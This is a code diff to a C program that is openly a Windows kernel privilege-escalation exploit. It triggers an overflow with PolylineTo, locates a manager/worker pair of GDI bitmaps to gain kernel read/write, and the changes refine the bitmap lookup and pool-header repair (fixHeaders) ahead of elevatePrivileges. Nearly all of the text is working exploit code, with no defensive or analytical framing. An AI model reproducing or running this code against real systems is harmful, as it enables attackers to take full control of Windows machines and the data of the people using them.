@@ -84,11 +84,11 @@ void exploitOverflow() {
 	points[0].x = 0x20;
 	PolylineTo(hdc, points, 0x3FE01);
 	points[0].y = y;
-	for (int j = 2; j < 0x156; j++) {
+	for (int j = 0; j < 0x154; j++) {
 		PolylineTo(hdc, points, 0x3FE01);
 	}
 
-	const int uniquePointsCount = 0x36; // for a total of 0x39 points coppied.
+	const int uniquePointsCount = 0x36;
 	for (int i = 0x3fe02 - uniquePointsCount; i < 0x3fe02; ++i) {
 		points[i].y = --y;
 	}
@@ -114,51 +114,45 @@ void resolveWorkerManager() {
 	//DebugBreak();
 	for (int i = 0; i < 5000; ++i) {
 		HBITMAP currentBitmap = bitmaps[i];
-		unsigned long long address = (unsigned long long)leakSurfaceAddress(currentBitmap);		
 		result = GetBitmapBits(currentBitmap, 0x1000, buff);
 		if (result == 0x1000) {
 			MANAGER_BITMAP = currentBitmap;
-			for (int j = 0; j < 5000; ++j) {
-				unsigned long long workerAddress = (unsigned long long)leakSurfaceAddress(bitmaps[j]);
-				if (0x1000 == workerAddress - address) {
-					WORKER_BITMAP = bitmaps[j];
-					//DebugBreak();
-					break;
-				}
-			}
+			WORKER_BITMAP = (HBITMAP)*((unsigned long long*)&buff[0xD98 + 0x10]);
 			break;
 		}
 
 	}
 }
 
-
-void fixHeaders() {
-	// pvScan0 buffer is 0x258 bytes after the SURFACE header.
-	// In order to avoid crashing, we need to do the following:
-	// 1. Fix overflown (manager) bitmap's _POOL_HEADER. This can be done by copying the _POOL_HEADER of the next bitmap,
-	//    which can be retrieved by reading 0x1000 bytes from the manager's pvScan0 buffer and then copying 0x10 bytes
-	//    beginning at 0x1000 - 0x258 - 0x10.
-	// 2. Save all data between *MANAGER.pvScan0 and WORKER.pvScan0 and append to before the address whenever we want to read/write
-	//    from an address. This data is the first 0x1000 - 0x258 + 0x50 bytes we can read using our manager bitmap.
-	// TODO: fixing the pool header is a bit more compilcated than this..
-
+void resolveBoilerplate() {
 	char buff[0x1000] = { 0 };
-	unsigned int result = 0;
-	
-	DebugBreak();
-	result = GetBitmapBits(MANAGER_BITMAP, 0x1000, buff);
-	if (result != 0x1000) {
-		DebugBreak();
-	}
-
-	//DebugBreak();
-	memcpy(BOILERPLATE_DATA, buff, sizeof(BOILERPLATE_DATA) - 0x8);
-	unsigned long long address = (unsigned long long)leakSurfaceAddress(MANAGER_BITMAP) - 0x10;
-	writeQword(address, (void*)&buff[0x1000 - 0x258 - 0x10]);
-	writeQword(address + 0x8, (void*)&buff[0x1000 - 0x258 - 0x10 + 0x8]);
+	GetBitmapBits(MANAGER_BITMAP, 0x1000, buff);
+	memcpy(BOILERPLATE_DATA, buff, 0xE00);
 }
 
+void fixHeaders() {
+	char buff[0x1000] = { 0 };
+	GetBitmapBits(MANAGER_BITMAP, 0x1000, buff);
+	unsigned long long managerBitmapAddress = (unsigned long long)leakSurfaceAddress(MANAGER_BITMAP);
+
+	DebugBreak();
+	unsigned long long address = managerBitmapAddress - 0x10;
+	writeQword(address, (unsigned long long*)&buff[0xD98]);
+	writeQword(address + 8, (unsigned long long*)&buff[0xDA0]);
+
+	address = address & 0xfffffffffffff000;
+	writeQword(address, (unsigned long long*)&buff[0x3E8]);
+	writeQword(address + 8, (unsigned long long*)&buff[0x3F0]);
+
+	address = managerBitmapAddress;
+	writeQword(address, (unsigned long long*)&MANAGER_BITMAP);
+	writeQword(address + 8, (unsigned long long*)&buff[0xD98 + 0x18]);
+	writeQword(address + 0x10, (unsigned long long*)&buff[0xD98 + 0x20]);
+	writeQword(address + 0x18, (unsigned long long*)&buff[0xD98 + 0x28]);
+	writeQword(address + 0x20, (unsigned long long*)&buff[0xD98 + 0x30]);
+	writeQword(address + 0x28, (unsigned long long*)&buff[0xD98 + 0x38]);
+	writeQword(address + 0x30, (unsigned long long*)&buff[0xD98 + 0x40]);
+}
 
 unsigned long long readQword(unsigned long long address) {
 	unsigned long long data = 0;
@@ -242,6 +236,7 @@ int main() {
 	exploitOverflow();
 	mapHdevPage();
 	resolveWorkerManager();
+	resolveBoilerplate();
 	fixHeaders();
 	elevatePrivileges();
 
